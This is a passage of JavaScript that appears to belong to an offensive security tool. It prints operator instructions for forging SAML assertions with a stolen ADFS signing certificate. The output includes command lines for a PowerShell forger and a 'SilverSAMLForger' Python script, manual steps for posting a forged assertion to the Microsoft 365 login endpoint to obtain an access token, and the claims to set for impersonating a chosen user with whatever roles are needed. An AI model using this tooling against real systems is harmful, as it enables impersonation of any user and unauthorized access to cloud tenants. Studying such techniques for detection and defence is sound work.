      `    -Audience '${audience || "urn:federation:MicrosoftOnline"}' -Issuer 'http://ADFS_HOST/adfs/services/trust'`,
    )
    output.push("")
    output.push("Option 2: SilverSAMLForger (Python)")
    output.push(`  python3 silversaml.py --pfx '${certPath}' --user '${targetUser}' \\`)
    output.push(`    --audience '${audience || "urn:federation:MicrosoftOnline"}' \\`)
    output.push("    --domain DOMAIN.COM")
    output.push("")
    output.push("Option 3: Manual (for O365 specifically)")
    output.push("  1. Generate SAML assertion with ImmutableID claim")
    output.push("  2. POST to https://login.microsoftonline.com/login.srf")
    output.push("  3. Extract access token from response")
    output.push("")
    output.push("Key claims to include:")
    output.push("  - NameID: " + targetUser)
    output.push("  - ImmutableID: Base64(ObjectGUID) for O365")
    output.push("  - UPN: user@domain.com")
    output.push("  - Groups/Roles: as needed for authorization")
    output.push(`  - Audience: ${audience || "urn:federation:MicrosoftOnline"}`)
    output.push("")
    output.push("[*] After forging, use with azure_ad_hybrid --action token for cloud access")
  }

  return { output: output.join("\n"), findings }
}
